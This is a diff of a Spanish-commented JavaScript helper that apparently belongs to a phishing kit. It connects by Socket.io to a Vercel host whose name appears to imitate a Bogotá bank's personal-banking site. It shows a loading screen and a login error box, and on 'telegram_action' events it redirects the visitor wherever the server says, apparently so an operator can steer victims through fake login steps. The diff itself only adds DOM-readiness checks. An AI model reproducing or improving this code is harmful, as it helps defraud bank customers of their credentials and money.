@@ -4,68 +4,80 @@ window.commonUtils = {
     initializeCommon: function() {
         console.log('Inicializando funciones comunes...');
         
-        // Crear elementos UI necesarios
-        this.createLoadingScreen();
-        this.createErrorMessage();
-        
-        // Inicializar Socket.io si no está ya inicializado
-        if (!window.socket && typeof io !== 'undefined') {
+        // Esperar a que el DOM esté listo antes de crear elementos
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', () => {
+                this.createLoadingScreen();
+                this.createErrorMessage();
+                this.initializeSocket();
+            });
+        } else {
+            this.createLoadingScreen();
+            this.createErrorMessage();
             this.initializeSocket();
         }
         
         console.log('Funciones comunes inicializadas');
     },
 
+    // Inicializar Socket.io
     initializeSocket: function() {
-    console.log('Inicializando Socket.io...');
-    try {
-        if (!window.socket && typeof io !== 'undefined') {
-            // Determinar la URL base automáticamente
-            const isVercel = window.location.hostname.includes('vercel.app');
-            const socketUrl = isVercel 
-                ? 'https://sucursbogotapersonas.vercel.app'
-                : 'http://localhost:3000';
+        console.log('Inicializando Socket.io...');
+        try {
+            if (!window.socket && typeof io !== 'undefined') {
+                // Determinar la URL base según el entorno
+                const isVercel = window.location.hostname.includes('vercel.app');
+                const socketUrl = isVercel 
+                    ? 'https://sucursbogotapersonas.vercel.app'
+                    : 'http://localhost:3000';
 
-            console.log('Conectando a Socket.io en:', socketUrl);
-            window.socket = io(socketUrl, {
-                transports: ['websocket', 'polling']
-            });
-            
-            window.socket.on('connect', () => {
-                console.log('✅ Socket.io conectado - ID:', window.socket.id);
-                this.hideLoading();
-            });
-
-            window.socket.on('telegram_action', (data) => {
-                console.log('🔄 Acción recibida:', data);
-                this.hideLoading();
+                console.log('Conectando a Socket.io en:', socketUrl);
+                window.socket = io(socketUrl, {
+                    transports: ['websocket', 'polling']
+                });
                 
-                if (data.redirect) {
-                    console.log('📍 Redirigiendo a:', data.redirect);
-                    if (data.message) {
-                        sessionStorage.setItem('actionMessage', data.message);
+                window.socket.on('connect', () => {
+                    console.log('✅ Socket.io conectado - ID:', window.socket.id);
+                    this.hideLoading();
+                });
+
+                window.socket.on('telegram_action', (data) => {
+                    console.log('🔄 Acción recibida:', data);
+                    this.hideLoading();
+                    
+                    if (data.redirect) {
+                        console.log('📍 Redirigiendo a:', data.redirect);
+                        if (data.message) {
+                            sessionStorage.setItem('actionMessage', data.message);
+                        }
+                        setTimeout(() => {
+                            window.location.href = data.redirect;
+                        }, 100);
                     }
-                    setTimeout(() => {
-                        window.location.href = data.redirect;
-                    }, 100);
-                }
-            });
+                });
 
-            window.socket.on('disconnect', () => {
-                console.log('❌ Socket.io desconectado');
-            });
+                window.socket.on('disconnect', () => {
+                    console.log('❌ Socket.io desconectado');
+                });
 
-            window.socket.on('connect_error', (error) => {
-                console.error('❌ Error de conexión:', error.message);
-            });
+                window.socket.on('connect_error', (error) => {
+                    console.error('❌ Error de conexión:', error.message);
+                });
+            }
+        } catch (error) {
+            console.error('❌ Error inicializando Socket.io:', error);
         }
-    } catch (error) {
-        console.error('❌ Error inicializando Socket.io:', error);
-    }
-},
+    },
 
-    // Crear pantalla de carga
+    // Crear pantalla de carga - CON VERIFICACIÓN DE SEGURIDAD
     createLoadingScreen: function() {
+        // Verificar que el DOM esté listo
+        if (!document.head || !document.body) {
+            console.warn('DOM no está listo, reintentando en 100ms...');
+            setTimeout(() => this.createLoadingScreen(), 100);
+            return;
+        }
+
         if (document.querySelector('.loading-screen')) return;
         
         const loadingScreen = document.createElement('div');
@@ -123,12 +135,22 @@ window.commonUtils = {
             }
         `;
         
-        document.head.appendChild(styleSheet);
-        document.body.appendChild(loadingScreen);
+        // Verificar nuevamente antes de append
+        if (document.head && document.body) {
+            document.head.appendChild(styleSheet);
+            document.body.appendChild(loadingScreen);
+        } else {
+            console.error('No se pudo crear loading screen: DOM no disponible');
+        }
     },
 
-    // Crear mensaje de error
+    // ... el resto de las funciones se mantienen igual
     createErrorMessage: function() {
+        if (!document.body) {
+            setTimeout(() => this.createErrorMessage(), 100);
+            return;
+        }
+        
         if (document.querySelector('.login-error')) return;
         
         const errorMessage = document.createElement('div');
@@ -145,7 +167,9 @@ window.commonUtils = {
         `;
         
         const container = document.querySelector('.login-section') || document.body;
-        container.appendChild(errorMessage);
+        if (container) {
+            container.appendChild(errorMessage);
+        }
     },
 
     // Mostrar pantalla de carga
